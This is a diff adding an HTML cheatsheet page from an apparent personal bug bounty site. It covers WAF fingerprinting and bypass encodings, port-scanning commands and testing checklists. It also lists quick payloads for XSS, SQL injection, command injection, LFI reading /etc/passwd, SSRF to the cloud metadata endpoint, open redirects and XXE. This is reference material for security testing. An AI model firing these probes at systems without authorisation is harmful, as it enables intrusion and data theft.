@@ -1,0 +1,729 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Quick Reference & Cheatsheets | Command Center</title>
+    <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+    <!-- Navigation -->
+    <nav>
+        <div class="nav-container">
+            <a href="index.html" class="nav-brand">⚡ BB Command Center</a>
+            <div class="nav-toggle">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+            <ul class="nav-menu">
+                <li class="nav-item"><a href="index.html" class="nav-link">Home</a></li>
+                <li class="nav-item"><a href="tools.html" class="nav-link">Tools</a></li>
+                <li class="nav-item"><a href="payloads.html" class="nav-link">Payloads</a></li>
+                <li class="nav-item"><a href="methodology.html" class="nav-link">Methodologies</a></li>
+                <li class="nav-item"><a href="recon.html" class="nav-link">Recon</a></li>
+                <li class="nav-item"><a href="notes.html" class="nav-link">Notes</a></li>
+            </ul>
+        </div>
+    </nav>
+
+    <div class="container">
+        <h1 style="color: var(--accent-green); font-size: 2.5rem; margin: 30px 0 15px;">📝 Quick Reference & Cheatsheets</h1>
+        <p style="color: var(--text-secondary); margin-bottom: 40px; font-size: 1.1rem;">
+            Essential cheatsheets and quick references for bug bounty testing
+        </p>
+
+        <!-- WAF Fingerprinting -->
+        <section class="section">
+            <h2 style="color: var(--accent-cyan); margin-bottom: 15px;">🛡️ WAF Fingerprinting</h2>
+            <p style="color: var(--text-primary); line-height: 1.8; margin-bottom: 20px;">
+                Identify Web Application Firewalls to understand filtering and develop bypass strategies.
+            </p>
+
+            <h3 style="color: var(--accent-green); margin-top: 25px;">Detection Tools</h3>
+            <div class="code-block">
+                <code># Automated WAF detection
+wafw00f https://target.com
+nmap -p 443 --script=http-waf-detect target.com
+whatwaf -u https://target.com</code>
+            </div>
+
+            <h3 style="color: var(--accent-green); margin-top: 25px;">Common WAF Indicators</h3>
+            <table class="data-table">
+                <thead>
+                    <tr>
+                        <th>WAF</th>
+                        <th>Detection Method</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>Cloudflare</td>
+                        <td>Server: cloudflare, __cfduid cookie, cf-ray header</td>
+                    </tr>
+                    <tr>
+                        <td>AWS WAF</td>
+                        <td>Server: awselb/2.0, x-amzn-* headers</td>
+                    </tr>
+                    <tr>
+                        <td>Akamai</td>
+                        <td>AkamaiGHost errors, X-Akamai-* headers</td>
+                    </tr>
+                    <tr>
+                        <td>Imperva</td>
+                        <td>visid_incap_ cookie, X-CDN: Incapsula</td>
+                    </tr>
+                    <tr>
+                        <td>ModSecurity</td>
+                        <td>406 Not Acceptable, Mod_Security messages</td>
+                    </tr>
+                    <tr>
+                        <td>Sucuri</td>
+                        <td>sucuri-block.css, X-Sucuri-* headers</td>
+                    </tr>
+                    <tr>
+                        <td>F5 BIG-IP</td>
+                        <td>BigIP* cookies, X-WA-Info header</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h3 style="color: var(--accent-green); margin-top: 25px;">Bypass Techniques</h3>
+            <div class="code-block">
+                <code># Case manipulation
+&lt;ScRiPt&gt;alert(1)&lt;/sCrIpT&gt;
+
+# URL encoding
+%3Cscript%3Ealert(1)%3C/script%3E
+
+# Double encoding
+%253Cscript%253E
+
+# Unicode encoding
+\u003cscript\u003e
+
+# HTML entity encoding
+&lt;script&gt;
+
+# NULL byte
+%00&lt;script&gt;alert(1)&lt;/script&gt;
+
+# Newline/CRLF injection
+%0a%0d&lt;script&gt;alert(1)&lt;/script&gt;</code>
+            </div>
+        </section>
+
+        <!-- HTTP Status Codes -->
+        <section class="section">
+            <h2 style="color: var(--accent-cyan); margin-bottom: 15px;">📊 HTTP Status Codes Reference</h2>
+            
+            <h3 style="color: var(--accent-green); margin-top: 20px;">2xx Success</h3>
+            <table class="data-table">
+                <thead>
+                    <tr>
+                        <th>Code</th>
+                        <th>Meaning</th>
+                        <th>Bug Hunting Relevance</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>200</td>
+                        <td>OK</td>
+                        <td>Successful request - check response body for data leaks</td>
+                    </tr>
+                    <tr>
+                        <td>201</td>
+                        <td>Created</td>
+                        <td>Resource created - test for privilege escalation</td>
+                    </tr>
+                    <tr>
+                        <td>204</td>
+                        <td>No Content</td>
+                        <td>Success but no body - blind vulnerabilities possible</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h3 style="color: var(--accent-green); margin-top: 20px;">3xx Redirection</h3>
+            <table class="data-table">
+                <thead>
+                    <tr>
+                        <th>Code</th>
+                        <th>Meaning</th>
+                        <th>Bug Hunting Relevance</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>301</td>
+                        <td>Moved Permanently</td>
+                        <td>Check Location header for open redirects</td>
+                    </tr>
+                    <tr>
+                        <td>302</td>
+                        <td>Found</td>
+                        <td>Temporary redirect - test for open redirect</td>
+                    </tr>
+                    <tr>
+                        <td>307</td>
+                        <td>Temporary Redirect</td>
+                        <td>Preserves request method - test method-based bypasses</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h3 style="color: var(--accent-green); margin-top: 20px;">4xx Client Errors</h3>
+            <table class="data-table">
+                <thead>
+                    <tr>
+                        <th>Code</th>
+                        <th>Meaning</th>
+                        <th>Bug Hunting Relevance</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>400</td>
+                        <td>Bad Request</td>
+                        <td>Malformed request - potential injection point</td>
+                    </tr>
+                    <tr>
+                        <td>401</td>
+                        <td>Unauthorized</td>
+                        <td>Test for auth bypass, broken authentication</td>
+                    </tr>
+                    <tr>
+                        <td>403</td>
+                        <td>Forbidden</td>
+                        <td>Access denied - test for authorization bypass</td>
+                    </tr>
+                    <tr>
+                        <td>404</td>
+                        <td>Not Found</td>
+                        <td>May still process requests - blind vulnerabilities</td>
+                    </tr>
+                    <tr>
+                        <td>405</td>
+                        <td>Method Not Allowed</td>
+                        <td>Try different HTTP methods (PUT, DELETE, PATCH)</td>
+                    </tr>
+                    <tr>
+                        <td>429</td>
+                        <td>Too Many Requests</td>
+                        <td>Rate limit hit - test for bypass techniques</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h3 style="color: var(--accent-green); margin-top: 20px;">5xx Server Errors</h3>
+            <table class="data-table">
+                <thead>
+                    <tr>
+                        <th>Code</th>
+                        <th>Meaning</th>
+                        <th>Bug Hunting Relevance</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>500</td>
+                        <td>Internal Server Error</td>
+                        <td>Server crash - check error messages for info disclosure</td>
+                    </tr>
+                    <tr>
+                        <td>502</td>
+                        <td>Bad Gateway</td>
+                        <td>Proxy error - potential for SSRF</td>
+                    </tr>
+                    <tr>
+                        <td>503</td>
+                        <td>Service Unavailable</td>
+                        <td>DoS condition or maintenance - test availability</td>
+                    </tr>
+                </tbody>
+            </table>
+        </section>
+
+        <!-- Authentication Testing Checklist -->
+        <section class="section">
+            <h2 style="color: var(--accent-cyan); margin-bottom: 15px;">🔐 Authentication Testing Checklist</h2>
+            <p style="color: var(--text-primary); line-height: 1.8; margin-bottom: 20px;">
+                Comprehensive checklist for testing authentication mechanisms.
+            </p>
+
+            <div style="background-color: var(--bg-primary); padding: 20px; border-radius: 8px; border: 1px solid var(--border-color);">
+                <div class="checkbox-group">
+                    <input type="checkbox" id="auth1">
+                    <label for="auth1">Test for default credentials (admin/admin, admin/password)</label>
+                </div>
+                <div class="checkbox-group">
+                    <input type="checkbox" id="auth2">
+                    <label for="auth2">Check password policy - minimum length, complexity requirements</label>
+                </div>
+                <div class="checkbox-group">
+                    <input type="checkbox" id="auth3">
+                    <label for="auth3">Test for username enumeration via login error messages</label>
+                </div>
+                <div class="checkbox-group">
+                    <input type="checkbox" id="auth4">
+                    <label for="auth4">Verify brute force protection - rate limiting, account lockout</label>
+                </div>
+                <div class="checkbox-group">
+                    <input type="checkbox" id="auth5">
+                    <label for="auth5">Test password reset mechanism for token predictability</label>
+                </div>
+                <div class="checkbox-group">
+                    <input type="checkbox" id="auth6">
+                    <label for="auth6">Check for password reset link expiration</label>
+                </div>
+                <div class="checkbox-group">
+                    <input type="checkbox" id="auth7">
+                    <label for="auth7">Test for session fixation vulnerabilities</label>
+                </div>
+                <div class="checkbox-group">
+                    <input type="checkbox" id="auth8">
+                    <label for="auth8">Verify session tokens are invalidated on logout</label>
+                </div>
+                <div class="checkbox-group">
+                    <input type="checkbox" id="auth9">
+                    <label for="auth9">Test for concurrent session handling</label>
+                </div>
+                <div class="checkbox-group">
+                    <input type="checkbox" id="auth10">
+                    <label for="auth10">Check session timeout configuration</label>
+                </div>
+                <div class="checkbox-group">
+                    <input type="checkbox" id="auth11">
+                    <label for="auth11">Test JWT token validation - algorithm, signature, expiration</label>
+                </div>
+                <div class="checkbox-group">
+                    <input type="checkbox" id="auth12">
+                    <label for="auth12">Verify secure cookie flags (HttpOnly, Secure, SameSite)</label>
+                </div>
+                <div class="checkbox-group">
+                    <input type="checkbox" id="auth13">
+                    <label for="auth13">Test 2FA implementation for bypass vulnerabilities</label>
+                </div>
+                <div class="checkbox-group">
+                    <input type="checkbox" id="auth14">
+                    <label for="auth14">Check for response manipulation during 2FA</label>
+                </div>
+                <div class="checkbox-group">
+                    <input type="checkbox" id="auth15">
+                    <label for="auth15">Test OAuth flow for open redirects and token leakage</label>
+                </div>
+                <div class="checkbox-group">
+                    <input type="checkbox" id="auth16">
+                    <label for="auth16">Verify CAPTCHA implementation and bypass potential</label>
+                </div>
+                <div class="checkbox-group">
+                    <input type="checkbox" id="auth17">
+                    <label for="auth17">Test for SQL injection in login forms</label>
+                </div>
+                <div class="checkbox-group">
+                    <input type="checkbox" id="auth18">
+                    <label for="auth18">Check for timing attacks on authentication</label>
+                </div>
+            </div>
+        </section>
+
+        <!-- Rate Limit Testing -->
+        <section class="section">
+            <h2 style="color: var(--accent-cyan); margin-bottom: 15px;">⏱️ Rate Limit Testing Checklist</h2>
+            <p style="color: var(--text-primary); line-height: 1.8; margin-bottom: 20px;">
+                Test for rate limiting and bypass techniques.
+            </p>
+
+            <div style="background-color: var(--bg-primary); padding: 20px; border-radius: 8px; border: 1px solid var(--border-color);">
+                <div class="checkbox-group">
+                    <input type="checkbox" id="rate1">
+                    <label for="rate1">Test for IP-based rate limiting</label>
+                </div>
+                <div class="checkbox-group">
+                    <input type="checkbox" id="rate2">
+                    <label for="rate2">Try using X-Forwarded-For header to bypass IP limits</label>
+                </div>
+                <div class="checkbox-group">
+                    <input type="checkbox" id="rate3">
+                    <label for="rate3">Test with X-Originating-IP, X-Remote-IP headers</label>
+                </div>
+                <div class="checkbox-group">
+                    <input type="checkbox" id="rate4">
+                    <label for="rate4">Change user agent on each request</label>
+                </div>
+                <div class="checkbox-group">
+                    <input type="checkbox" id="rate5">
+                    <label for="rate5">Rotate through multiple proxies/VPNs</label>
+                </div>
+                <div class="checkbox-group">
+                    <input type="checkbox" id="rate6">
+                    <label for="rate6">Test different HTTP methods (GET vs POST)</label>
+                </div>
+                <div class="checkbox-group">
+                    <input type="checkbox" id="rate7">
+                    <label for="rate7">Try adding null bytes (%00) to parameters</label>
+                </div>
+                <div class="checkbox-group">
+                    <input type="checkbox" id="rate8">
+                    <label for="rate8">Test case sensitivity in endpoints (/API vs /api)</label>
+                </div>
+                <div class="checkbox-group">
+                    <input type="checkbox" id="rate9">
+                    <label for="rate9">Add trailing slashes or extra path segments</label>
+                </div>
+                <div class="checkbox-group">
+                    <input type="checkbox" id="rate10">
+                    <label for="rate10">Test with different Content-Type headers</label>
+                </div>
+                <div class="checkbox-group">
+                    <input type="checkbox" id="rate11">
+                    <label for="rate11">Use race conditions to bypass limits</label>
+                </div>
+                <div class="checkbox-group">
+                    <input type="checkbox" id="rate12">
+                    <label for="rate12">Test API versioning bypass (/v1/ vs /v2/)</label>
+                </div>
+            </div>
+        </section>
+
+        <!-- IDOR Checklist -->
+        <section class="section">
+            <h2 style="color: var(--accent-cyan); margin-bottom: 15px;">🔓 IDOR Testing Checklist</h2>
+            <p style="color: var(--text-primary); line-height: 1.8; margin-bottom: 20px;">
+                Insecure Direct Object Reference testing methodology.
+            </p>
+
+            <div style="background-color: var(--bg-primary); padding: 20px; border-radius: 8px; border: 1px solid var(--border-color);">
+                <div class="checkbox-group">
+                    <input type="checkbox" id="idor1">
+                    <label for="idor1">Test numeric IDs sequentially (1, 2, 3, 100, 1000)</label>
+                </div>
+                <div class="checkbox-group">
+                    <input type="checkbox" id="idor2">
+                    <label for="idor2">Try UUID/GUID manipulation</label>
+                </div>
+                <div class="checkbox-group">
+                    <input type="checkbox" id="idor3">
+                    <label for="idor3">Test with different HTTP methods (GET, POST, PUT, DELETE)</label>
+                </div>
+                <div class="checkbox-group">
+                    <input type="checkbox" id="idor4">
+                    <label for="idor4">Check for encoded IDs (base64, hex)</label>
+                </div>
+                <div class="checkbox-group">
+                    <input type="checkbox" id="idor5">
+                    <label for="idor5">Test parameter pollution (id=1&id=2)</label>
+                </div>
+                <div class="checkbox-group">
+                    <input type="checkbox" id="idor6">
+                    <label for="idor6">Try array notation (id[]=1&id[]=2)</label>
+                </div>
+                <div class="checkbox-group">
+                    <input type="checkbox" id="idor7">
+                    <label for="idor7">Test JSON array in request body</label>
+                </div>
+                <div class="checkbox-group">
+                    <input type="checkbox" id="idor8">
+                    <label for="idor8">Check for wildcard or * as ID value</label>
+                </div>
+                <div class="checkbox-group">
+                    <input type="checkbox" id="idor9">
+                    <label for="idor9">Test negative IDs (-1, -100)</label>
+                </div>
+                <div class="checkbox-group">
+                    <input type="checkbox" id="idor10">
+                    <label for="idor10">Try very large numbers (999999999)</label>
+                </div>
+                <div class="checkbox-group">
+                    <input type="checkbox" id="idor11">
+                    <label for="idor11">Test with different user roles/privileges</label>
+                </div>
+                <div class="checkbox-group">
+                    <input type="checkbox" id="idor12">
+                    <label for="idor12">Check response for other users' data even if access denied</label>
+                </div>
+                <div class="checkbox-group">
+                    <input type="checkbox" id="idor13">
+                    <label for="idor13">Test bulk operations for batch IDOR</label>
+                </div>
+                <div class="checkbox-group">
+                    <input type="checkbox" id="idor14">
+                    <label for="idor14">Look for predictable patterns in IDs</label>
+                </div>
+            </div>
+        </section>
+
+        <!-- Account Takeover Checklist -->
+        <section class="section">
+            <h2 style="color: var(--accent-cyan); margin-bottom: 15px;">👤 Account Takeover Checklist</h2>
+            <p style="color: var(--text-primary); line-height: 1.8; margin-bottom: 20px;">
+                Testing for account takeover vulnerabilities.
+            </p>
+
+            <div style="background-color: var(--bg-primary); padding: 20px; border-radius: 8px; border: 1px solid var(--border-color);">
+                <div class="checkbox-group">
+                    <input type="checkbox" id="ato1">
+                    <label for="ato1">Test password reset token for predictability</label>
+                </div>
+                <div class="checkbox-group">
+                    <input type="checkbox" id="ato2">
+                    <label for="ato2">Check if reset tokens expire properly</label>
+                </div>
+                <div class="checkbox-group">
+                    <input type="checkbox" id="ato3">
+                    <label for="ato3">Test for password reset token leakage in Referer</label>
+                </div>
+                <div class="checkbox-group">
+                    <input type="checkbox" id="ato4">
+                    <label for="ato4">Try host header injection in password reset</label>
+                </div>
+                <div class="checkbox-group">
+                    <input type="checkbox" id="ato5">
+                    <label for="ato5">Test email parameter manipulation (victim@email.com)</label>
+                </div>
+                <div class="checkbox-group">
+                    <input type="checkbox" id="ato6">
+                    <label for="ato6">Check for response manipulation in 2FA</label>
+                </div>
+                <div class="checkbox-group">
+                    <input type="checkbox" id="ato7">
+                    <label for="ato7">Test 2FA code reusability</label>
+                </div>
+                <div class="checkbox-group">
+                    <input type="checkbox" id="ato8">
+                    <label for="ato8">Try brute force on 2FA codes (rate limit testing)</label>
+                </div>
+                <div class="checkbox-group">
+                    <input type="checkbox" id="ato9">
+                    <label for="ato9">Test for session fixation during login</label>
+                </div>
+                <div class="checkbox-group">
+                    <input type="checkbox" id="ato10">
+                    <label for="ato10">Check OAuth redirect_uri validation</label>
+                </div>
+                <div class="checkbox-group">
+                    <input type="checkbox" id="ato11">
+                    <label for="ato11">Test for open redirect in OAuth flow</label>
+                </div>
+                <div class="checkbox-group">
+                    <input type="checkbox" id="ato12">
+                    <label for="ato12">Try JWT token manipulation (alg: none)</label>
+                </div>
+                <div class="checkbox-group">
+                    <input type="checkbox" id="ato13">
+                    <label for="ato13">Test for CSRF on email change functionality</label>
+                </div>
+                <div class="checkbox-group">
+                    <input type="checkbox" id="ato14">
+                    <label for="ato14">Check for CSRF on password change</label>
+                </div>
+                <div class="checkbox-group">
+                    <input type="checkbox" id="ato15">
+                    <label for="ato15">Test race condition in signup/verification</label>
+                </div>
+            </div>
+        </section>
+
+        <!-- Common Ports & Services -->
+        <section class="section">
+            <h2 style="color: var(--accent-cyan); margin-bottom: 15px;">🔌 Common Ports & Services</h2>
+            
+            <table class="data-table">
+                <thead>
+                    <tr>
+                        <th>Port</th>
+                        <th>Service</th>
+                        <th>What to Test</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>21</td>
+                        <td>FTP</td>
+                        <td>Anonymous login, weak credentials, directory traversal</td>
+                    </tr>
+                    <tr>
+                        <td>22</td>
+                        <td>SSH</td>
+                        <td>Weak credentials, outdated versions, user enumeration</td>
+                    </tr>
+                    <tr>
+                        <td>23</td>
+                        <td>Telnet</td>
+                        <td>Unencrypted, default credentials</td>
+                    </tr>
+                    <tr>
+                        <td>25</td>
+                        <td>SMTP</td>
+                        <td>Email spoofing, open relay, user enumeration</td>
+                    </tr>
+                    <tr>
+                        <td>53</td>
+                        <td>DNS</td>
+                        <td>Zone transfer, DNS cache poisoning, subdomain brute force</td>
+                    </tr>
+                    <tr>
+                        <td>80</td>
+                        <td>HTTP</td>
+                        <td>Web vulnerabilities, information disclosure</td>
+                    </tr>
+                    <tr>
+                        <td>443</td>
+                        <td>HTTPS</td>
+                        <td>SSL/TLS issues, web vulnerabilities, certificate validation</td>
+                    </tr>
+                    <tr>
+                        <td>3306</td>
+                        <td>MySQL</td>
+                        <td>Default credentials, SQL injection, remote access</td>
+                    </tr>
+                    <tr>
+                        <td>3389</td>
+                        <td>RDP</td>
+                        <td>Weak credentials, BlueKeep vulnerability, session hijacking</td>
+                    </tr>
+                    <tr>
+                        <td>5432</td>
+                        <td>PostgreSQL</td>
+                        <td>Default credentials, SQL injection, remote access</td>
+                    </tr>
+                    <tr>
+                        <td>6379</td>
+                        <td>Redis</td>
+                        <td>No authentication, SSRF, RCE via EVAL</td>
+                    </tr>
+                    <tr>
+                        <td>8080</td>
+                        <td>HTTP Proxy</td>
+                        <td>Open proxy, web admin panels, management interfaces</td>
+                    </tr>
+                    <tr>
+                        <td>8443</td>
+                        <td>HTTPS Alt</td>
+                        <td>Web vulnerabilities on alternate port</td>
+                    </tr>
+                    <tr>
+                        <td>9200</td>
+                        <td>Elasticsearch</td>
+                        <td>Unauthenticated access, data exposure, RCE</td>
+                    </tr>
+                    <tr>
+                        <td>27017</td>
+                        <td>MongoDB</td>
+                        <td>No authentication, data exposure, NoSQL injection</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h3 style="color: var(--accent-green); margin-top: 25px;">Port Scanning Commands</h3>
+            <div class="code-block">
+                <code># Fast scan of common ports
+nmap -F target.com
+
+# Service version detection
+nmap -sV -p- target.com
+
+# Comprehensive scan with NSE scripts
+nmap -sC -sV -p- -T4 target.com -oA scan-results
+
+# Using masscan for speed
+masscan -p1-65535 target.com --rate=1000
+
+# Using naabu (fast)
+naabu -host target.com -top-ports 1000
+
+# Specific port scan
+nmap -p 80,443,8080,8443 target.com</code>
+            </div>
+        </section>
+
+        <!-- Quick Payload Reference -->
+        <section class="section">
+            <h2 style="color: var(--accent-cyan); margin-bottom: 15px;">⚡ Quick Payload Reference</h2>
+            
+            <h3 style="color: var(--accent-green); margin-top: 20px;">XSS Quick Test</h3>
+            <div class="code-block">
+                <code>&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;img src=x onerror=alert(1)&gt;
+&lt;svg onload=alert(1)&gt;
+javascript:alert(1)</code>
+            </div>
+
+            <h3 style="color: var(--accent-green); margin-top: 20px;">SQLi Quick Test</h3>
+            <div class="code-block">
+                <code>' OR '1'='1
+' OR 1=1--
+" OR "1"="1
+admin'--
+' UNION SELECT NULL--</code>
+            </div>
+
+            <h3 style="color: var(--accent-green); margin-top: 20px;">Command Injection Quick Test</h3>
+            <div class="code-block">
+                <code>; whoami
+| whoami
+&& whoami
+`whoami`
+$(whoami)</code>
+            </div>
+
+            <h3 style="color: var(--accent-green); margin-top: 20px;">LFI Quick Test</h3>
+            <div class="code-block">
+                <code>../../../etc/passwd
+....//....//....//etc/passwd
+..%2F..%2F..%2Fetc%2Fpasswd
+php://filter/convert.base64-encode/resource=index.php</code>
+            </div>
+
+            <h3 style="color: var(--accent-green); margin-top: 20px;">SSRF Quick Test</h3>
+            <div class="code-block">
+                <code>http://127.0.0.1
+http://localhost
+http://169.254.169.254/latest/meta-data/
+http://0.0.0.0
+http://[::1]</code>
+            </div>
+
+            <h3 style="color: var(--accent-green); margin-top: 20px;">Open Redirect Quick Test</h3>
+            <div class="code-block">
+                <code>?redirect=https://evil.com
+?url=//evil.com
+?next=https://evil.com
+?return=//evil.com</code>
+            </div>
+
+            <h3 style="color: var(--accent-green); margin-top: 20px;">XXE Quick Test</h3>
+            <div class="code-block">
+                <code>&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE root [&lt;!ENTITY test SYSTEM 'file:///etc/passwd'&gt;]&gt;
+&lt;root&gt;&test;&lt;/root&gt;</code>
+            </div>
+        </section>
+
+        <!-- Quick Tips -->
+        <section class="info-box">
+            <h4>💡 Quick Bug Hunting Tips</h4>
+            <ul style="margin-left: 20px; line-height: 1.8;">
+                <li><strong>Always check different HTTP methods</strong> - GET, POST, PUT, DELETE, PATCH, OPTIONS</li>
+                <li><strong>Test both authenticated and unauthenticated</strong> - Many bugs only appear in one state</li>
+                <li><strong>Read JavaScript files thoroughly</strong> - They contain endpoints, logic, and secrets</li>
+                <li><strong>Check mobile APIs separately</strong> - Often have different security controls</li>
+                <li><strong>Test edge cases</strong> - Negative numbers, very large values, special characters</li>
+                <li><strong>Chain vulnerabilities</strong> - Low-severity bugs can combine for critical impact</li>
+                <li><strong>Document everything</strong> - You'll forget details if you don't write them down</li>
+            </ul>
+        </section>
+
+    </div>
+
+    <!-- Footer -->
+    <footer>
+        <div class="footer-text">
+            Bug Bounty Command Center | Your Personal Security Research Platform
+        </div>
+    </footer>
+
+    <script src="js/main.js"></script>
+</body>
+</html>
